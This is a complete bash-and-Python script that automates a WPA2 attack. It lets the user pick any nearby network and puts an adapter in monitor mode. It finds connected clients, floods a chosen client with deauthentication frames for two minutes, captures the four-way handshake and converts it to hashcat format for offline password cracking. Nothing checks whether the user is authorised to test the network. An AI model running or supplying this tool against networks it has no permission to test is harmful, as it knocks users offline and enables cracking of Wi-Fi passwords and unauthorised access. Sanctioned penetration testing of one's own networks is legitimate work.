#!/usr/bin/bash
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 guest3301 – provided "AS IS", no warranty

BLACK=$'\033[30;47m'
RED=$'\033[31m'
GREEN=$'\033[32m'
YELLOW=$'\033[33m'
BG_RED=$'\033[41m'
BG_BLUE=$'\033[44m'
REV_YELLOW=$'\033[7;33m'
REV_RED=$'\033[1;41m'
BOLD=$'\033[1m'
RESET=$'\033[0m'

banner='
         _       _   _ _       _                     _     _           _        
      __| | ___ | |_/ / |     | |__   __ _ _ __   __| |___| |__   __ _| | _____ 
     / _` |/ _ \| __| | |_____| '\''_ \ / _` | '\''_ \ / _` / __| '\''_ \ / _` | |/ / _ \
    | (_| | (_) | |_| | |_____| | | | (_| | | | | (_| \__ \ | | | (_| |   <  __/
     \__,_|\___/ \__|_|_|     |_| |_|\__,_|_| |_|\__,_|___/_| |_|\__,_|_|\_\___|
                                                
'
# ascii banner feels cool, isn't it? ;)

print() {
    printf '%s%s%s\n' "$1" "$2" "$RESET"
}

print "$RED" "$banner"
print "$REV_RED" "WPA2 handshake capture tool"
print "$REV_RED" "By guest3301, a script that attempts to capture a WPA2 four-way handshake and converts it to hashcat (mode 22000) format."
print "$REV_RED" "because author's lazy:)"
print ""

if (( EUID != 0 )); then
    print "$RED" "[-] You must be root to do this." 1>&2
    exit 100
fi

if ! command -v aircrack-ng >/dev/null 2>&1; then
    print "$YELLOW" "[-] This script requires aircrack-ng suite but it's not installed. Aborting."
    exit 1
fi

if command -v python3 >/dev/null 2>&1; then
    PYTHON_CMD="python3"
elif command -v python >/dev/null 2>&1; then
    PYTHON_CMD="python"
else
    echo "[-] Python is not installed. Aborting."
    exit 1
fi

# CAUTION: AI-generated code START.
get_adapters() {
    local adapters=()
    for iface in /sys/class/net/*; do
        if [ -d "$iface/wireless" ]; then
            iface_name=$(basename "$iface")
            # Get the PHY name for this interface
            phy_link=$(readlink "$iface/phy80211" 2>/dev/null)
            if [ -n "$phy_link" ]; then
                phy=$(basename "$phy_link")
                # Use 'iw phy' to check if this PHY supports monitor mode
                if iw phy "$phy" info 2>/dev/null | grep -q monitor; then
                    adapters+=("$iface_name")
                fi
            fi
        fi
    done
    echo "${adapters[@]}"
}
# Get all adapters that support monitor mode
adapters=($(get_adapters))

if [ ${#adapters[@]} -eq 0 ]; then
    print "$RED" "[-] No Wi-Fi adapter supporting monitor mode found."
    exit 1
elif [ ${#adapters[@]} -eq 1 ]; then
    chosen="${adapters[0]}"
    print "$GREEN" "[+] Using adapter: $chosen"
else
    print "$YELLOW" "[+] Multiple adapters found:"
    PS3="Select an adapter: "
    select chosen in "${adapters[@]}"; do
        if [ -n "$chosen" ]; then
            break
        else
            print "$RED" "[-] Invalid choice, try again."
        fi
    done
fi

print "$GREEN" "[+] Selected interface: $chosen"
# CAUTION: AI-generated code END.

#############################################################
# INCASE I MIGHT WANNA SWITCH BACK TO MANAGED MODE          #
#############################################################
if [[ $1 == "stop" ]]; then                                 #
sudo airmon-ng stop "$chosen" 2>/dev/null                   #
sudo systemctl restart NetworkManager 2>/dev/null           #
exit 0                                                      #
fi                                                          #
#############################################################

# CAUTION: AI-generated code START.
raw=$(nmcli -t -f SSID,CHAN,SECURITY,BSSID device wifi list 2>/dev/null)
ssids=(); bssids=(); chans=(); secs=()

while IFS= read -r line; do
    IFS=: read -r ssid chan sec b1 b2 b3 b4 b5 b6 <<< "$line"
    bssid="$b1:$b2:$b3:$b4:$b5:$b6"
    ssids+=("$ssid")
    bssids+=("$bssid")
    chans+=("$chan")
    secs+=("$sec")
done <<< "$raw"

PS3="[*] Select a network (number): "

select ssid in "${ssids[@]}"; do
    if [ -n "$ssid" ]; then
        for i in "${!ssids[@]}"; do
            if [ "${ssids[i]}" == "$ssid" ]; then
                chosen_bssid="${bssids[i]}"
                chosen_chan="${chans[i]}"
                chosen_sec="${secs[i]}"
                break
            fi
        done
        print "$GREEN" "[+] Selected: $ssid ($chosen_bssid)"
        break
    else
        print "$RED" "[-] Invalid choice, try again."
    fi
done
# CAUTION: AI-generated code END.

print "$YELLOW" "[*] Killing interfering processes and enabling monitor mode on $chosen ..."
airmon-ng check kill 2>/dev/null
mon_iface=$(airmon-ng start "$chosen" 2>/dev/null | grep "monitor mode" | grep -oP 'monitor mode enabled on \K[^ ]*' | head -1)
if [[ -z "$mon_iface" ]]; then
    # try to read the new interface name from iw as a fallback
    mon_iface=$(iw dev | awk '/Interface/ {print $2}' | grep "mon$" | head -1)
fi
if [[ -z "$mon_iface" ]]; then
    print "$RED" "[-] Failed to create monitor interface."
    exit 1
fi
print "$GREEN" "[+] Monitor interface: $mon_iface"


export BSSID="$chosen_bssid"
export CHAN="$chosen_chan"
export MON_IFACE="$mon_iface"

$PYTHON_CMD -c '

import subprocess, os, time, sys, re, signal

R = "\033[31m"
G = "\033[32m"
NC = "\033[0m"

bssid_ = os.getenv("BSSID")
chan  = os.getenv("CHAN")
mon   = os.getenv("MON_IFACE")
if not bssid_ or not chan or not mon:
    print(R + "[-] Missing environment variables.")
    sys.exit(1)

# will try to clean up backslashes that ended up in our bssid

bssid = re.sub(r"\\+", "", bssid_)
bssid = re.sub(r"[^0-9A-Fa-f:]", "", bssid)
if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
    print(R + "[-] Invalid BSSID after sanitizing: {} ".format(bssid))
    sys.exit(1)

print("[*] BSSID: {}".format(bssid))

scan_dir = "/tmp/ws_scan"
os.makedirs(scan_dir, exist_ok=True)
# Clean old files
import glob
for f in glob.glob(os.path.join(scan_dir, "scan*")):
    os.remove(f)

scan_prefix = os.path.join(scan_dir, "scan")
print("[*] Scanning for clients on {} (channel {}) for 30 seconds...".format(bssid, chan))

# Start airodump-ng in background
scan_proc = subprocess.Popen(
    ["airodump-ng", "--bssid", bssid, "-c", chan,
     "-w", scan_prefix, "--output-format", "csv", mon],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
)

# Wait 30 seconds and then terminate
try:
    scan_proc.wait(timeout=30)
except subprocess.TimeoutExpired:
    # Send SIGINT to stop cleanly
    scan_proc.send_signal(signal.SIGINT)
    try:
        scan_proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        scan_proc.kill()
        scan_proc.wait()

# Give it a moment to flush the CSV
time.sleep(1)

csv_file = scan_prefix + "-01.csv"
if not os.path.isfile(csv_file):
    print(R + "[-] Scan file not found." + NC )
    sys.exit(1)

clients = []
try:
    with open(csv_file, "r") as f:
        lines = f.readlines()
    station = False
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if "Station MAC" in line:
            station = True
            continue
        if station:
            parts = line.split(",")
            if len(parts) >= 5:
                mac = parts[0].strip()
                if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac):
                    try:
                        packets = int(parts[4].strip())
                    except (ValueError, IndexError):
                        packets = 0
                    if packets > 0:
                        clients.append(mac)
except Exception as e:
    print(R + "[-] Error reading CSV:", e)
    sys.exit(1)

if not clients:
    print(R + "[-] No connected client found." + NC)
    sys.exit(1)

if len(clients) == 1:
    client_mac = clients[0]
    print(G + "[+] Only one client: {}".format(client_mac))
else:
    print(G + "[+] Multiple clients found:" + NC)
    for idx, mac in enumerate(clients, 1):
        print("  {} {}".format(idx, mac))
    choice = input("Select client number: ").strip()
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(clients):
            client_mac = clients[idx]
        else:
            print(R + "[-] Invalid choice." + NC)
            sys.exit(1)
    except ValueError:
        print(R + "[-] Invalid input." + NC)
        sys.exit(1)

print(G + "[+] Deauth target: {}".format(client_mac))

rc = input("Enter deauth reason code (default 4): ").strip() or "4"
if not rc.isdigit():
    print(R + "[-] Invalid reason code, using 4." + NC)
    rc = "4"

cap_dir = "/tmp/ws_handshake"
os.makedirs(cap_dir, exist_ok=True)
cap_prefix = os.path.join(cap_dir, "capture")

print("[*] Starting capture..." + NC)
cap_proc = subprocess.Popen(
    ["airodump-ng", "--bssid", bssid, "-c", chan, "-w", cap_prefix,
     "--output-format", "pcap", mon],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
)
time.sleep(2)

print("[*] Sending deauth frames (reason code {}) for 120s...".format(rc))
try:
    subprocess.run(
        ["aireplay-ng", "--deauth", "0", "-a", bssid,
         "-c", client_mac, "--deauth-rc", rc, mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        timeout=120
    )
except subprocess.TimeoutExpired:
    pass
print(G + "[+] Deauth finished." + NC)

time.sleep(5)
cap_proc.send_signal(signal.SIGINT)
try:
    cap_proc.wait(timeout=5)
except subprocess.TimeoutExpired:
    cap_proc.kill()
    cap_proc.wait()

pcap_file = cap_prefix + "-01.cap"
print("[*] Checking for EAPOL handshake..." + NC)
check = subprocess.run(["aircrack-ng", pcap_file], capture_output=True, text=True)
if "1 handshake" in check.stdout or "1 handshake" in check.stderr:
    print(G + "[+] EAPOL handshake captured!" + NC)
    if subprocess.run(["which", "hcxpcapngtool"], capture_output=True).returncode == 0:
        out_22000 = cap_prefix + ".22000"
        subprocess.run(["hcxpcapngtool", "-o", out_22000, pcap_file],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if os.path.isfile(out_22000):
            print(G + "[+] Hashcat file (mode 22000): {}".format(out_22000))
        else:
            print(R + "[-] hcxpcapngtool conversion failed." + NC)
    else:
        print("[!] hcxpcapngtool not found, creating .hccapx")
        subprocess.run(["aircrack-ng", pcap_file, "-J", cap_prefix],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        hccapx = cap_prefix + ".hccapx"
        if os.path.isfile(hccapx):
            print(G + "[+] Hashcat file (mode 2500): {}".format(hccapx))
        else:
            print(R + "[-] .hccapx creation failed." + NC)
else:
    print(R + "[-] No EAPOL handshake in capture." + NC)
'

print "$YELLOW" "[*] Cleaning up monitor interface..."
sudo airmon-ng stop "$mon_iface" &>/dev/null
sudo systemctl restart NetworkManager &>/dev/null
print "$GREEN" "[+] Done."
exit 0
